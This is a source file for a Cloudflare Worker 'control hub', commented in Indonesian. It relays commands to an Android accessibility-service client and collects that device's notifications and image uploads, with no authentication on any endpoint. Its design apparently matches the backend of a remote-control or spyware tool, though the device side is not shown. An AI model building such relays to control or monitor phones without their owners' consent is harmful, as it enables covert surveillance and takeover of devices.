// ==============================
// Cloudflare Worker - Control Hub
// ==============================

let lastCommand = "";           // command terakhir
let incomingQueue = [];        // data dari website / panel
let notifications = [];        // notif dari device

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // ======================
    // SEND COMMAND (Android UI / Web)
    // ======================
    if (path === "/send") {
      const cmd = url.searchParams.get("cmd") || "";
      if (cmd) {
        lastCommand = cmd;
        incomingQueue.push({
          type: "CMD",
          value: cmd,
          time: Date.now()
        });
      }
      return text("OK");
    }

    // ======================
    // POLL COMMAND (Android Accessibility)
    // ======================
    if (path === "/poll") {
      const cmd = lastCommand;
      lastCommand = ""; // auto clear setelah dibaca
      return text(cmd);
    }

    // ======================
    // INCOMING DATA (Website → Android)
    // ======================
    if (path === "/incoming") {
      const data = [...incomingQueue];
      incomingQueue = []; // clear queue setelah diambil

      return json({
        data
      });
    }

    // ======================
    // DEVICE NOTIFICATION
    // ======================
    if (path === "/notify" && request.method === "POST") {
      const body = await request.text();
      notifications.push({
        text: body,
        time: Date.now()
      });

      // optional: limit memory
      if (notifications.length > 100) notifications.shift();

      return text("RECEIVED");
    }

    // ======================
    // IMAGE UPLOAD (ANDROID)
    // ======================
    if (path === "/send_image" && request.method === "POST") {
      // image diterima, tidak disimpan (stateless worker)
      return text("IMAGE_OK");
    }

    // ======================
    // MONITOR PANEL (OPTIONAL)
    // ======================
    if (path === "/status") {
      return json({
        lastCommand,
        queueSize: incomingQueue.length,
        notifications: notifications.slice(-5)
      });
    }

    return text("Worker Online");
  }
};

// ======================
// Helpers
// ======================
function text(t) {
  return new Response(t, {
    headers: { "Content-Type": "text/plain" }
  });
}

function json(obj) {
  return new Response(JSON.stringify(obj, null, 2), {
    headers: { "Content-Type": "application/json" }
  });
}
